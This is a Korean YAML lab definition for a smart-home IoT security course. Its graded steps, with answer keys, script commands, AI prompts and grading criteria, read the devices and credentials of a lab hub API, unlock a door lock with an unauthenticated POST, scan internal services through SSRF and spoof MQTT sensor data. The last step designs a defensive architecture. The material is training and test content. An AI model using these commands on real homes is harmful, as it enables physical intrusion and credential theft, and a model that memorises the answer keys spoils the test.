lab_id: iot-security-ai-week10
title: 스마트홈 보안 (AI 지원)
version: ai
course: iot-security-ai
week: 10
description: 스마트홈 허브 API 공격, 디바이스 제어, 프로토콜 분석을 수행합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 스마트홈 허브의 API를 분석하고 취약점을 발견한다
- 미인증 API로 디바이스를 제어한다
- 스마트홈 보안 아키텍처를 설계한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 스마트홈 허브 API(8090)에서 디바이스 목록을 수집하시오.
  hint: curl http://{{WEB_IP}}:8090/api/devices를 사용하세요.
  category: recon
  points: 10
  answer: '🤖 프롬프트: 스마트홈 허브 API(8090)에서 디바이스 목록을 수집해줘

    📎 참고 (CLI): curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool 2>/dev/null
    | head -15; echo ''디바이스 목록 수집 완료'''
  answer_detail: 미인증 API에서 전체 디바이스 목록과 상태 정보를 수집할 수 있습니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 스마트홈 허브 디바이스 목록 API 수집 — curl -s http://10.20.30.80:8090/api/devices | python3 -m json.tool
        | head -15 으로 Home Assistant/SmartThings 스타일 허브 API 미인증 접근하여 JSON 포맷팅 후 상위 15줄 출력. 연결된 IoT 디바이스
        인벤토리 탈취로 공격 계획 수립.
      success_criteria:
      - curl -s 로 /api/devices 엔드포인트 접근
      - python3 -m json.tool 로 JSON pretty-print
      - head -15 으로 응답 상위 15줄 확인
      acceptable_methods:
      - curl + python json.tool + head
      - httpie http GET /api/devices 로 자동 포맷
      - jq . 로 JSON 파싱 대체
      - postman collection 저장 후 반복 조회
      negative_signs:
      - Authorization 헤더 포함 (익명 공격 무효화)
      - JSON 포맷팅 없이 원문 덤프
      - head 없이 전체 출력
  target_vm: attacker
  script: curl -s http://10.20.30.80:8090/api/devices 2>/dev/null | python3 -m json.tool 2>/dev/null |
    head -15; echo '디바이스 목록 수집 완료'
  risk_level: low
  bastion_prompt: 스마트홈 허브 API(8090)에서 디바이스 목록을 수집해줘
- order: 2
  instruction: 허브 설정 정보(/api/config)에서 민감 데이터를 추출하시오.
  hint: WiFi 비밀번호, MQTT 인증 정보, API 키를 확인하세요.
  category: data_leak
  points: 12
  answer: '🤖 프롬프트: 허브 설정 정보(/api/config)에서 민감 데이터를 추출해줘

    📎 참고 (CLI): curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null
    | head -20; echo ''설정 정보 수집 완료'''
  answer_detail: 설정 API에서 WiFi 비밀번호, MQTT 인증 정보, 클라우드 API 키 등이 노출됩니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 허브 설정 API 민감 정보 탈취 — curl -s http://10.20.30.80:8090/api/config | python3 -m json.tool |
        head -20 으로 WiFi 비밀번호/MQTT 인증 정보/클라우드 API 키 등 평문 크리덴셜 JSON 노출. CWE-200 (Information Exposure)
        + CWE-798 (Hardcoded Credentials).
      success_criteria:
      - curl -s /api/config 엔드포인트 접근
      - json.tool 포매팅 후 head -20 으로 설정 내용 확인
      - WiFi 패스워드/MQTT creds/API keys 등 민감 정보 발견
      acceptable_methods:
      - curl + json.tool + head
      - jq .wifi.password 특정 필드 추출
      - grep -iE password|key|secret 필터링
      - trufflehog 로 시크릿 패턴 자동 탐지
      negative_signs:
      - /api/config 대신 /api/devices 만 수집
      - head 없이 전체 응답
      - 민감 데이터 분류 없이 덤프만
  target_vm: attacker
  script: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null |
    head -20; echo '설정 정보 수집 완료'
  risk_level: low
  bastion_prompt: 허브 설정 정보(/api/config)에서 민감 데이터를 추출해줘
- order: 3
  instruction: API를 통해 현관 도어락(lock_front)을 해제하시오.
  hint: POST /api/devices/lock_front/control에 action:unlock을 전송하세요.
  category: attack
  points: 12
  answer: "\U0001F916 프롬프트: API를 통해 현관 도어락(lock_front)을 해제해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X\
    \ POST http://10.20.30.80:8090/api/devices/lock_front/control \\\n     -H 'Content-Type:application/json'\
    \ \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락 해제 완료'"
  answer_detail: 인증 없는 API로 도어락을 해제할 수 있으면 물리적 보안 위협이 됩니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: '스마트홈 물리 디바이스 제어 (도어락 해제) — curl -X POST http://10.20.30.80:8090/api/devices/lock_front/control
        -H Content-Type: application/json -d {action:unlock} 으로 인증 없이 JSON POST 하여 현관 도어락 원격 해제. 사이버-물리
        공격의 직접적 피해 시나리오 (침입 범죄 가능). OWASP IoT I1 + MITRE T1559.'
      success_criteria:
      - curl -X POST /api/devices/lock_front/control 으로 제어 엔드포인트 호출
      - 'Content-Type: application/json 헤더 + JSON body'
      - -d {action:unlock} 으로 해제 명령 전송
      acceptable_methods:
      - curl -X POST + JSON body
      - httpie http POST /url action=unlock 단축
      - postman 수동 요청
      - 자동 공격 스크립트 Python requests.post
      negative_signs:
      - Content-Type 헤더 누락으로 JSON 파싱 실패
      - GET 메서드 잘못 사용
      - 사이버-물리 위협 맥락 누락
  target_vm: attacker
  script: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control \\\n     -H\
    \ 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락\
    \ 해제 완료'"
  risk_level: low
  bastion_prompt: API를 통해 현관 도어락(lock_front)을 해제해줘
- order: 4
  instruction: SSRF 취약점을 이용하여 내부 서비스를 스캔하시오.
  hint: /api/webhook/test?url=http://내부IP 형식을 사용하세요.
  category: attack
  points: 10
  answer: '🤖 프롬프트: SSRF 취약점을 이용하여 내부 서비스를 스캔해줘

    📎 참고 (CLI): curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null
    | head -5; echo ''SSRF 테스트 완료'''
  answer_detail: SSRF(Server-Side Request Forgery)로 허브에서 내부 서비스에 접근할 수 있습니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: SSRF (Server-Side Request Forgery) 내부망 스캔 — curl -s http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/
        으로 허브의 webhook 기능을 이용해 내부 루프백 IP 의 다른 서비스 접근. CWE-918 SSRF + OWASP A10:2021. 외부에서 접근 불가한 내부 관리
        API 노출.
      success_criteria:
      - curl 로 /api/webhook/test?url=<target> 엔드포인트 접근
      - url 파라미터에 127.0.0.1:<내부포트> 주입하여 내부 서비스 프록싱
      - head -5 으로 내부 서비스 응답 일부 수신
      acceptable_methods:
      - curl + url 파라미터 조작
      - SSRFmap 자동 SSRF 공격 도구
      - Burp Collaborator 로 blind SSRF 탐지
      - AWS metadata endpoint 169.254.169.254 시도 (cloud SSRF)
      negative_signs:
      - 127.0.0.1 대신 외부 IP 지정
      - 내부 스캔 결과 해석 누락
      - SSRF + OWASP A10 매핑 맥락 없음
  target_vm: attacker
  script: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null |
    head -5; echo 'SSRF 테스트 완료'
  risk_level: low
  bastion_prompt: SSRF 취약점을 이용하여 내부 서비스를 스캔해줘
- order: 5
  instruction: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입하시오.
  hint: mosquitto_pub으로 센서 토픽에 메시지를 발행하세요.
  category: mqtt
  points: 10
  answer: '🤖 프롬프트: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입해줘

    📎 참고 (CLI): mosquitto_pub -h 10.20.30.80 -t ''homeassistant/sensor/temperature/state'' -m ''{"value":-30,"unit":"C"}''
    2>/dev/null && echo ''MQTT 데이터 주입 완료'''
  answer_detail: MQTT 미인증 접근으로 센서 데이터를 조작하면 자동화 규칙이 오동작할 수 있습니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: MQTT 센서 데이터 스푸핑 (자동화 규칙 오작동 유도) — mosquitto_pub -h 10.20.30.80 -t homeassistant/sensor/temperature/state
        -m {value:-30,unit:C} 으로 Home Assistant MQTT 디스커버리 형식에 맞는 토픽에 비현실적 온도 -30°C 주입. 자동화 규칙(히터 켜기)이
        오작동하여 물리 피해.
      success_criteria:
      - mosquitto_pub -h <원격IP> 원격 브로커 연결
      - -t homeassistant/sensor/<device>/state 디스커버리 경로 사용
      - -m JSON 페이로드 {value:-30,unit:C} 로 비정상 온도 주입
      acceptable_methods:
      - mosquitto_pub + Home Assistant discovery 토픽
      - paho-mqtt python publish 프로그래밍
      - MQTT Explorer GUI 로 publish
      - Node-RED 악성 플로우 설정
      negative_signs:
      - homeassistant/ 접두사 없이 임의 토픽
      - 비현실적 값 주입 없이 정상 데이터만
      - 자동화 규칙 오작동 시나리오 맥락 없음
  target_vm: attacker
  script: mosquitto_pub -h 10.20.30.80 -t 'homeassistant/sensor/temperature/state' -m '{"value":-30,"unit":"C"}'
    2>/dev/null && echo 'MQTT 데이터 주입 완료'
  risk_level: low
  bastion_prompt: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입해줘
- order: 6
  instruction: 스마트홈 보안 아키텍처를 설계하시오. VLAN 분리, API 인증, 암호화를 포함하시오.
  hint: 네트워크, 인증, 암호화 각 계층의 대책을 정리하세요.
  category: verification
  points: 10
  answer: '🤖 프롬프트: 스마트홈 보안 아키텍처를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''=== 스마트홈 보안 아키텍처 ==='' && echo ''[네트워크] IoT 전용 VLAN + 방화벽'' && echo ''[인증] API
    JWT 토큰 + RBAC'' && echo ''[암호화] MQTT TLS + HTTPS'' && echo ''[모니터링] 이상 행위 탐지'' && echo ''[물리] 허브 잠금
    보관'' && echo ''=== 아키텍처 설계 완료 ==='''
  answer_detail: 스마트홈 보안은 다층 방어(Defense in Depth) 전략을 적용해야 합니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: '스마트홈 다층 보안 아키텍처 설계 — echo 으로 5 계층: [네트워크] IoT 전용 VLAN + 방화벽 세그먼테이션 + [인증] API JWT 토큰 +
        RBAC 권한 모델 + [암호화] MQTT TLS(포트 8883) + HTTPS + [모니터링] 이상 행위 탐지(SIEM/IDS) + [물리] 허브 잠금 보관. Defense
        in Depth 전략.'
      success_criteria:
      - echo === 스마트홈 보안 아키텍처 === 마커 출력
      - 네트워크/인증/암호화/모니터링/물리 5 계층 각각 대책
      - 다층 방어(Defense in Depth) 원칙 적용
      acceptable_methods:
      - echo 평면 출력
      - markdown 아키텍처 문서 저장
      - draw.io 네트워크 다이어그램 생성
      - NIST SP 800-213 IoT 보안 가이드 준거
      negative_signs:
      - 5 계층 중 일부 누락
      - VLAN/JWT/TLS 등 구체적 기술 없이 추상적 서술
      - Defense in Depth 원칙 언급 누락
  target_vm: attacker
  script: echo '=== 스마트홈 보안 아키텍처 ===' && echo '[네트워크] IoT 전용 VLAN + 방화벽' && echo '[인증] API JWT 토큰 + RBAC'
    && echo '[암호화] MQTT TLS + HTTPS' && echo '[모니터링] 이상 행위 탐지' && echo '[물리] 허브 잠금 보관' && echo '=== 아키텍처
    설계 완료 ==='
  risk_level: low
  bastion_prompt: 스마트홈 보안 아키텍처를 설계하시오. VLAN 분리, API 인증, 암호화를 포함하시오.
